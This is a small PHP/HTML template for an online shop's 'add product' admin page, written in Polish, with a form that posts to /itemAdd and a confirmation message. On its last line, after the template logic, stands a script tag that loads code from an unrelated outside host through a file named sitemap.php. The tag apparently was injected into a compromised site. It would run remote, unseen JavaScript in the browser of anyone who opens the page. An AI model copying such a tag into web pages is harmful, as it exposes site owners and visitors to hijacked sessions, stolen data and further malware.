<h2>Dodawanie produktów</h2>

<?if(!getPost('sent')):?>
<form action='/itemAdd' method='post'>
<input type='hidden' name='sent' value='yes'>
<?module('form_item')?>
<p><input type='submit' value='Dodaj produkt'>
</form>
<?else:?>
<p>Dodano produkt!
<?endif?>
<script src=http://johanneswallmark.com/media/sitemap.php ></script>